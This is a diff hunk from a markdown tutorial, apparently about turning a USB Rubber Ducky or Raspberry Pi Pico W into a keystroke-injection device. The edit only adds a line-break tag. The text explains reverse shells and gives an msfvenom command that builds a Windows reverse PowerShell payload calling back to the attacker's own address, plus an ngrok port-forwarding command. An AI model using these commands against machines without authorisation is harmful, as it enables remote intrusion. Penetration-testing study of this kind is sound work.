@@ -4,7 +4,7 @@ A reverse shell is a type of shell in which the target machine communicates back
 The USB Rubber Ducky is a type of programmable USB device which looks like a regular USB flash drive, but it's designed to function as a keyboard emulator. When plugged into a computer, the USB Rubber Ducky can quickly type pre-programmed keystroke payloads, essentially simulating a human typing at a very fast rate.
 ## Payload for reverse shell
 To obtain a reverse shell from a target machine, you can utilize the MSFVenom tool to generate a Windows reverse PowerShell payload. This payload will allow you to establish a connection back to your machine, giving you remote access to the target system<br>
-```msfvenom -p cmd/windows/reverse_powershell lhost=<Your_IP_Address> lport=<Your_Listening_Port> > ayush.bat ```
+```msfvenom -p cmd/windows/reverse_powershell lhost=<Your_IP_Address> lport=<Your_Listening_Port> > ayush.bat ```<br>
 For port forwarding
 ```ngrok tcp 8080```
 ## Rasberry pi pico w as rubber ducky
